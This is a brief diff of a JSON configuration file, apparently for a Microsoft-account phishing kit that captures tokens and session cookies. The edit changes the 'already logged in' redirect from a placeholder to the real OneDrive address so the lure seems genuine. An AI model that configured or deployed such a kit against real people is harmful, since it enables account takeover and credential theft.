@@ -9,7 +9,7 @@
   "scopes": "offline_access openid",
   "phishingHTML": "index.html",
   "redirectUrl": "https://www.microsoft.com",
-  "alreadyLoggedInURL": "https://onedriveURLwithContentOrSomethingElse",
+  "alreadyLoggedInURL": "https://onedrive.live.com/",
   "cookieExpirationInDays": 90,
   "userCodesFile": "successful_user_code_cookies.txt",
   "logFile": "logfile.txt",
